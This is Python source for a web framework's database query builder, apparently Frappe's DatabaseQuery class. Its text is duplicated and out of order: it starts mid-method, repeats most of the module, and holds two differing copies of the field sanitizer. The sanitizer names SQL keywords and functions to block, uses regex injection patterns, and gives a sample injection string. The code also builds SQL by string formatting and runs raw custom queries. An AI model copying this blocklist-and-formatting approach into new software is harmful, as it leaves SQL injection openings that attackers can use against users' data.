			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case',                    
			'from', 'group', 'order', 'by']                    
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
					or self.fields[0].lower().startswith("max(")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = "`tab{0}`.`{1}` {2}".format(self.doctype, sort_field or "modified", sort_order or "desc")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = "`tab{0}`.docstatus asc, {1}".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by(self, parameters):
		"""Check order by, group by so that atleast one column is selected and does not have subquery"""
		if not parameters:
			return

		_lower = parameters.lower()
		if 'select' in _lower and ' from ' in _lower:
			frappe.throw(_('Cannot use sub-query in order by'))


		for field in parameters.split(","):
			if "." in field and field.strip().startswith("`tab"):
				tbl = field.strip().split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_("Please select atleast 1 column from {0} to sort/group").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if "_comments" in r:
				r._comment_count = len(json.loads(r._comments or "[]"))

	def update_user_settings(self):
		# update user settings if new search
		user_settings = json.loads(get_user_settings(self.doctype))

		if hasattr(self, 'user_settings'):
			user_settings.update(self.user_settings)

		if self.save_user_settings_fields:
			user_settings['fields'] = self.user_settings_fields

		update_user_settings(self.doctype, user_settings)

def get_order_by(doctype, meta):
	order_by = ""

	sort_field = sort_order = None
	if meta.sort_field and ',' in meta.sort_field:
		# multiple sort given in doctype definition
		# Example:
		# `idx desc, modified desc`
		# will covert to
		# `tabItem`.`idx` desc, `tabItem`.`modified` desc
		order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(doctype,
			f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
	else:
		sort_field = meta.sort_field or 'modified'
		sort_order = (meta.sort_field and meta.sort_order) or 'desc'

		order_by = "`tab{0}`.`{1}` {2}".format(doctype, sort_field or "modified", sort_order or "desc")

	# draft docs always on top
	if meta.is_submittable:
		order_by = "`tab{0}`.docstatus asc, {1}".format(doctype, order_by)

	return order_by


@frappe.whitelist()
def get_list(doctype, *args, **kwargs):
	'''wrapper for DatabaseQuery'''
	kwargs.pop('cmd', None)
	kwargs.pop('ignore_permissions', None)
	return DatabaseQuery(doctype).execute(None, *args, **kwargs)

def is_parent_only_filter(doctype, filters):
	#check if filters contains only parent doctype
	only_parent_doctype = True

	if isinstance(filters, list):
		for flt in filters:
			if doctype not in flt:
				only_parent_doctype = False
			if 'Between' in flt:
				flt[3] = get_between_date_filter(flt[3])

	return only_parent_doctype

def get_between_date_filter(value, df=None):
	'''
		return the formattted date as per the given example
		[u'2017-11-01', u'2017-11-03'] => '2017-11-01 00:00:00.000000' AND '2017-11-04 00:00:00.000000'
	'''
	from_date = None
	to_date = None
	date_format = "%Y-%m-%d %H:%M:%S.%f"

	if df:
		date_format = "%Y-%m-%d %H:%M:%S.%f" if df.fieldtype == 'Datetime' else "%Y-%m-%d"

	if value and isinstance(value, (list, tuple)):
		if len(value) >= 1: from_date = value[0]
		if len(value) >= 2: to_date = value[1]

	if not df or (df and df.fieldtype == 'Datetime'):
		to_date = add_to_date(to_date,days=1)

	data = "'%s' AND '%s'" % (
		get_datetime(from_date).strftime(date_format),
		get_datetime(to_date).strftime(date_format))

	return data

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

from six import iteritems, string_types

"""build query for doclistview and return results"""

import frappe, json, copy, re
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.client import check_parent_permission
from frappe.model.utils.user_settings import get_user_settings, update_user_settings
from datetime import datetime

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_user_settings=False, save_user_settings_fields=False,
		update=None, add_total_row=None, user_settings=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, "read", user=user):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(self.doctype))
			raise frappe.PermissionError(self.doctype)

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], string_types):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  ["`tab{0}`.`name`".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.user_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if user_settings:
			self.user_settings = json.loads(user_settings)

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_user_settings:
			self.save_user_settings_fields = save_user_settings_fields
			self.update_user_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = "where " + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.sanitize_fields()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != "`tab" + self.doctype + "`":
					self.fields.append(t + ".name as '%s:name'" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += " {join} {child} on ({child}.parent = {main}.name)".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append("({0})".format(" or ".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else "") + \
				' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)

		self.validate_order_by_and_group_by(args.order_by)
		args.order_by = args.order_by and (" order by " + args.order_by) or ""

		self.validate_order_by_and_group_by(self.group_by)
		args.group_by = self.group_by and (" group by " + self.group_by) or ""

		return args

	def parse_args(self):
		"""Convert fields and filters from strings to list, dicts"""
		if isinstance(self.fields, string_types):
			if self.fields == "*":
				self.fields = ["*"]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split(",")]

		for filter_name in ["filters", "or_filters"]:
			filters = getattr(self, filter_name)
			if isinstance(filters, string_types):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in iteritems(fdict):
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def sanitize_fields(self):
		'''
			regex : ^.*[,();].*
			purpose : The regex will look for malicious patterns like `,`, '(', ')', ';' in each
					field which may leads to sql injection.
			example :
				field = "`DocType`.`issingle`, version()"

			As field contains `,` and mysql function `version()`, with the help of regex
			the system will filter out this field.
		'''

		sub_query_regex = re.compile("^.*[,();].*")
		blacklisted_keywords = ['select', 'create', 'insert', 'delete', 'drop', 'update', 'case']
		blacklisted_functions = ['concat', 'concat_ws', 'if', 'ifnull', 'nullif', 'coalesce',
			'connection_id', 'current_user', 'database', 'last_insert_id', 'session_user',
			'system_user', 'user', 'version']

		def _raise_exception():
			frappe.throw(_('Use of sub-query or function is restricted'), frappe.DataError)

		def _is_query(field):
			if re.compile("^(select|delete|update|drop|create)\s").match(field):
				_raise_exception()

			elif re.compile("\s*[a-zA-z]*\s*( from | group by | order by | where | join )").match(field):                    
				_raise_exception()

		for field in self.fields:
			if sub_query_regex.match(field):
				if any(keyword in field.lower().split() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("({0}".format(keyword) in field.lower() for keyword in blacklisted_keywords):
					_raise_exception()

				if any("{0}(".format(keyword) in field.lower() for keyword in blacklisted_functions):
					_raise_exception()

			if re.compile("[a-zA-Z]+\s*'").match(field):                    
				_raise_exception()

			if re.compile('[a-zA-Z]+\s*,').match(field):                    
				_raise_exception()

			_is_query(field)


	def extract_tables(self):
		"""extract tables from fields"""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not ("tab" in f and "." in f) ) or ("locate(" in f) or ("count(" in f):
					continue

				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			frappe.flags.error_message = _('Insufficient Permission for {0}').format(frappe.bold(doctype))
			raise frappe.PermissionError(doctype)

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		"""Removes optional columns like `_user_tags`, `_comments` etc. if not in table"""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, string_types):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append("(" + match_conditions + ")")

	def build_filter_conditions(self, filters, conditions, ignore_permissions=None):
		"""build conditions from user filters"""
		if ignore_permissions is not None:
			self.flags.ignore_permissions = ignore_permissions

		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, string_types):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		"""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator "value"
		"""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator.lower() in ('in', 'not in'):
			values = f.value or ''
			if not isinstance(values, (list, tuple)):
				values = values.split(",")

			fallback = "''"
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '("{0}")'.format('", "'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get("fields", {"fieldname": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in ("Check", "Float", "Int", "Currency", "Percent"):
				can_be_null = False

			if f.operator.lower() == 'between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype=="Date" or df.fieldtype=="Datetime"))):

				value = get_between_date_filter(f.value, df)
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Date":
				value = getdate(f.value).strftime("%Y-%m-%d")
				fallback = "'0000-00-00'"

			elif (df and df.fieldtype=="Datetime") or isinstance(f.value, datetime):
				value = get_datetime(f.value).strftime("%Y-%m-%d %H:%M:%S.%f")
				fallback = "'0000-00-00 00:00:00'"

			elif df and df.fieldtype=="Time":
				value = get_time(f.value).strftime("%H:%M:%S.%f")
				fallback = "'00:00:00'"

			elif f.operator.lower() in ("like", "not like") or (isinstance(f.value, string_types) and
				(not df or df.fieldtype not in ["Float", "Int", "Currency", "Percent", "Check"])):
					value = "" if f.value==None else f.value
					fallback = '""'

					if f.operator.lower() in ("like", "not like") and isinstance(value, string_types):
						# because "like" uses backslash (\) for escaping
						value = value.replace("\\", "\\\\").replace("%", "%%")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, string_types) and not f.operator.lower() == 'between':
				value = '"{0}"'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator.lower() in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		"""add match conditions if applicable"""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get("read") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_("No permission to read {0}").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get("apply_user_permissions", {}).get("read"):
				# get user permissions
				user_permissions = frappe.permissions.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get("user_permission_doctypes").get("read"))

			if role_permissions.get("if_owner", {}).get("read"):
				self.match_conditions.append("`tab{0}`.owner = '{1}'".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = ""
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = "((" + ") or (".join(self.match_conditions) + "))"

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  "({conditions}) or ({shared_condition})".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """`tab{0}`.name in ({1})""".format(self.doctype, ", ".join(["'%s'"] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)
		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				cond = 'ifnull(`tab{doctype}`.`{fieldname}`, "")=""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					if not cint(frappe.get_system_settings("apply_strict_user_permissions")):
						condition = cond + " or "
					else:
						condition = ""
					condition += """`tab{doctype}`.`{fieldname}` in ({values})""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values=", ".join([('"'+frappe.db.escape(v, percent=False)+'"') for v in user_permission_values]))
				else:
					condition = cond

				match_conditions.append("({condition})".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append(" and ".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks("permission_query_conditions", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return " and ".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)

		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = ""

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith("count(")
					or self.fields[0].lower().startswith("min(")
